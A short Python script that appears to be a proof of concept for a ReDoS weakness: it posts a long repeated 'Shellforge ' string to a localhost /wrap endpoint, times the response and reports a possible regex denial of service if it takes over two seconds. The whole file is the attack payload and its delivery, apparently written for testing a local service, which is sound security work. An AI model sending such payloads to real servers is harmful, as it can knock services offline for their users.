import requests
import time

url = "http://localhost:3000/wrap"
# 100000
payload = "Shellforge " * 500  # ReDoS payload: many spaces

headers = {
    "Content-Type": "text/plain"
}

print("Sending payload...")
start_time = time.time()

response = requests.post(url, data=payload, headers=headers)

end_time = time.time()
elapsed = end_time - start_time

print(f"Status Code: {response.status_code}")
print(f"Response Time: {elapsed:.2f} seconds")
print("Response Body:")
print(response.text)

if elapsed > 2:
    print("⚠️ Possible ReDoS triggered!")
else:
    print("✅ Server handled input without delay.")
